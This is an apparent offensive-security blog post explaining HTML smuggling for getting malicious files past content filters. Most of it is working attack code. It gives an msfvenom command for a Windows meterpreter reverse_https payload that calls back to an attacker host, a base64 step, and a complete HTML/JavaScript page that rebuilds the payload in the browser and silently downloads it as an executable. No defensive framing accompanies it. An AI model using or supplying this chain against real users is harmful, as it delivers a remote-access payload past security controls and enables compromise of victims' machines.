---
description: >-
  HTML Smuggling
title: HTML Smuggling              # Add title here
date: 2025-05-19 08:00:00 -0600                           # Change the date to match completion date
categories: [22 Evasion Techniques, HTML Smuggling]          # Change Templates to Writeup
tags: [evasion, html smuggling]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png          # Add infocard image here for post preview image
---

Using a combination of HTML5 and JavaScript to sneak malicious files past content filters is not a new offensive technique. This mechanism has been incorporated into popular offensive frameworks such as Demiguise and SharpShooter for example.

HTML smuggling is a file delivery technique that leverages HTML5 and JavaScript to build a file directly in the browser — rather than downloading it from a remote server — and then triggers a download, often without triggering network-based antivirus or proxy protections.

Generate a payload with msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<your_ip> LPORT=443 -f exe -o payload.exe
```

Convert to Base64:
```bash
base64 payload.exe | tr -d '\n'
```

Then stick your payload to this Javascript/HTML page:
```html
<html>
  <body>
    <script>
      function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {
          bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
      }

      // === Base64 payload here (one-line string) ===
      var file = '<BASE64_PAYLOAD>'; 

      var data = base64ToArrayBuffer(file);
      var blob = new Blob([data], { type: 'application/octet-stream' });
      var fileName = 'msfstaged.exe';

      // === Cross-browser download logic ===
      if (window.navigator && window.navigator.msSaveOrOpenBlob) {
        // For Internet Explorer and older Edge
        window.navigator.msSaveOrOpenBlob(blob, fileName);
      } else {
        // For modern browsers (Chrome, Firefox, new Edge)
        var a = document.createElement('a');
        var url = window.URL.createObjectURL(blob);
        a.style = 'display: none';
        a.href = url;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
      }
    </script>
  </body>
</html>

```
